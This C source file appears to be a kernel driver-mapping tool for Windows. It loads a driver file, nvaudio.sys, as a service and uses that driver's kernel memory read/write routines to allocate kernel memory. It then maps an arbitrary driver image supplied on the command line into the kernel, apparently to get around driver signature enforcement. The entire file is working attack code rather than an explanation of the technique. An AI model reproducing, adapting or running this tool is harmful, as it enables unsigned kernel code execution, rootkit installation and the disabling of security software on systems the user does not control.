#include "main.h"

void _cdecl wmain2(_In_ int argc, _In_ wchar_t* argv[])
{
    NTSTATUS status;
    PUNICODE_STRING CurrentPath;
    LPWSTR DeviceName;
    LPWSTR DriverPath;
    LPWSTR ServiceName;
    DEVICE_DRIVER_OBJECT Driver;

    ServiceName = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\NVR0Internal";
    DeviceName  = L"\\Device\\NVR0Internal";
    CurrentPath = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
    DriverPath  = RtlAllocateMemory(MAX_PATH * sizeof(WCHAR));

    StringCchCopyW(DriverPath, MAX_PATH, CurrentPath->Buffer);
    StringCchCatW(DriverPath, MAX_PATH, L"nvaudio.sys");

    printf("[+] ServiceName: %ws.\r\n", ServiceName);
    printf("[+] DeviceName: %ws.\r\n", DeviceName);
    printf("[+] DriverPath: %ws.\r\n", DriverPath);

    status = LoadDriver(&Driver.DeviceHandle, DriverPath, ServiceName, DeviceName);
    if NT_SUCCESS (status) {
        Driver.ReadMemory  = ReadSystemMemory;
        Driver.WriteMemory = WriteSystemMemory;

        ULONGLONG PoolAddress = ExAllocatePool2(&Driver, PAGE_SIZE);
        if (PoolAddress) {
            printf("[+] PoolAddress: 0x%llX.", PoolAddress);
            ExFreePool(&Driver, PoolAddress);
        }

        UnloadDriver(Driver.DeviceHandle, ServiceName);
    }
    RtlFreeMemory(DriverPath);
}

void _cdecl wmain(_In_ int argc, _In_ wchar_t* argv[])
{
    NTSTATUS status;
    HANDLE fileHandle;
    UNICODE_STRING unicodeString;
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK ioStatus;
    HANDLE sectionHandle;
    PVOID ImageBase;
    SIZE_T ImageSize;
    DEVICE_DRIVER_OBJECT Driver;
    PUNICODE_STRING CurrentPath;
    LPWSTR DeviceName;
    LPWSTR DriverPath;
    LPWSTR ServiceName;

    if (argc < 2) {
        wprintf(L"[!] invalid arguments.\r\n\t%ws <Driver Path>", argv[0]);
        return;
    }

    if (RtlDosPathNameToNtPathName_U(argv[1], &unicodeString, NULL, NULL) == FALSE) {
        wprintf(L"[!] invalid object path, make sure it correct and exists: %ws.", argv[1]);
        return;
    }

    InitializeObjectAttributes(&objectAttributes, &unicodeString, (OBJ_CASE_INSENSITIVE), NULL, NULL);
    status = NtOpenFile(&fileHandle, FILE_EXECUTE, &objectAttributes, &ioStatus, FILE_SHARE_READ, 0);

    if NT_ERROR (status) {
        PRINT_ERROR_STATUS(RtlNtStatusToDosError(status));
        return;
    }

    InitializeObjectAttributes(&objectAttributes, NULL, (OBJ_CASE_INSENSITIVE), NULL, NULL);
    status = NtCreateSection(&sectionHandle, SECTION_ALL_ACCESS, &objectAttributes, (PLARGE_INTEGER)NULL, PAGE_EXECUTE, SEC_IMAGE, fileHandle);

    if NT_ERROR (status) {
        NtClose(fileHandle);
        PRINT_ERROR_STATUS(RtlNtStatusToDosError(status));
        return;
    }

    ImageBase = NULL;
    ImageSize = 0;
    status    = NtMapViewOfSection(sectionHandle, NtCurrentProcess(), &ImageBase, 0, 0, NULL, &ImageSize, ViewUnmap, 0, PAGE_EXECUTE);

    NtClose(sectionHandle);
    NtClose(fileHandle);
    if NT_ERROR (status) {
        PRINT_ERROR_STATUS(RtlNtStatusToDosError(status));
        return;
    }

    ServiceName = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\NVR0Internal";
    DeviceName  = L"\\Device\\NVR0Internal";
    CurrentPath = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
    DriverPath  = RtlAllocateMemory(MAX_PATH * sizeof(WCHAR));

    StringCchCopyW(DriverPath, MAX_PATH, CurrentPath->Buffer);
    StringCchCatW(DriverPath, MAX_PATH, L"nvaudio.sys");

    status = LoadDriver(&Driver.DeviceHandle, DriverPath, ServiceName, DeviceName);
    if NT_SUCCESS (status) {
        Driver.ReadMemory  = ReadSystemMemory;
        Driver.WriteMemory = WriteSystemMemory;

        status = MmLoadSystemImage(&Driver, ImageBase);

        UnloadDriver(Driver.DeviceHandle, ServiceName);
    }

    RtlFreeMemory(DriverPath);
    NtUnmapViewOfSection(NtCurrentProcess(), ImageBase);
    return;
}
